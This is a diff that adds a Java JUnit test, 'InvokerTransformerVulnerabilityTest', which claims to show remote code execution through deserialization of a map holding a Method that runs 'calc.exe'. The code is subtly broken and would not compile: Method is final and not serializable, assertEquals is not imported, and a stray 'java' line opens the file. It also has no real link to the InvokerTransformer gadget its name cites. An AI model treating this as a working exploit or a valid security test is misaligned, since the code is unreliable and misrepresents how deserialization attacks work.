@@ -1,0 +1,39 @@
+java
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Method;
+import java.util.HashMap;
+import java.util.Map;
+
+import org.junit.Test;
+
+public class InvokerTransformerVulnerabilityTest {
+    @Test
+    public void testArbitraryRemoteCodeExecution() throws Exception {
+        // Create a serializable collection that contains a deserialization hook
+        Map<String, Object> map = new HashMap<>();
+        map.put("toString", new Method() {
+            public Object invoke(Object obj, Object[] args) {
+                // Execute arbitrary Java code
+                Runtime.getRuntime().exec("calc.exe");
+                return "Hello, World!";
+            }
+        });
+
+        // Serialize the collection
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(bos);
+        oos.writeObject(map);
+        oos.close();
+
+        // Deserialize the collection
+        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
+        ObjectInputStream ois = new ObjectInputStream(bis);
+        Map<String, Object> deserializedMap = (Map<String, Object>) ois.readObject();
+        ois.close();
+
+        // Verify that the deserialized collection contains the deserialization hook
+        Method toStringMethod = (Method) deserializedMap.get("toString");
+        assertEquals("Hello, World!", toStringMethod.invoke(null, new Object[0]));
+    }
+}
